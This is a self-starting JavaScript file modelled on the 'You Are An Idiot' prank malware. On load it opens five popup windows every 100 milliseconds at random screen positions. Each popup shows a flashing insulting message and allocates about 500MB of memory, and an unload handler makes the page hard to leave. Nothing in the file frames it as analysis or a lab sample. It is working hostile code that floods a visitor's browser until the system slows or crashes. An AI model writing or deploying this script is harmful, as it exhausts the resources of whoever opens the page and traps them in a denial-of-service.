function openWindow(url) {
    var newWin = window.open("", "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');

    // Move the new window to a random location once
    if (newWin) {
        var screenWidth = screen.width - 357; // Keep within bounds
        var screenHeight = screen.height - 330;

        var randomX = Math.floor(Math.random() * screenWidth);
        var randomY = Math.floor(Math.random() * screenHeight);

        newWin.moveTo(randomX, randomY);

        // Write custom content inside the blank page
        newWin.document.write(`
            <html>
                <head>
                    <title>YOU ARE AN IDIOT</title>
                    <style>
                        body { background: red; color: white; text-align: center; font-size: 24px; margin-top: 100px; }
                    </style>
                </head>
                <body>
                    <h1>AHHHHHH!</h1>
                    <script>
                        const x = new Uint8Array(1024 * 1024 * 1024 * 0.5).fill(255); // 500MB
                        setInterval(() => {
                            if (document.body.style.background === 'red') {
                                document.body.style.background = 'blue';
                                document.querySelector('h1').textContent = 'HELP!';
                            } else {
                                document.body.style.background = 'red';
                                document.querySelector('h1').textContent = 'AHHHHHH!';
                            }
                        }, 500);
                    </script>
                </body>
            </html>
        `);
    }

    return newWin;
}

function proCreate() {
    setInterval(() => {
        for (var i = 0; i < 5; i++) {
            openWindow('');
        }
    }, 100); // Adjust delay as needed
}

window.onbeforeunload = function () {
    return "Are you an idiot?";
};

// Self-executing function to start immediately
(function () {
        proCreate();
})();
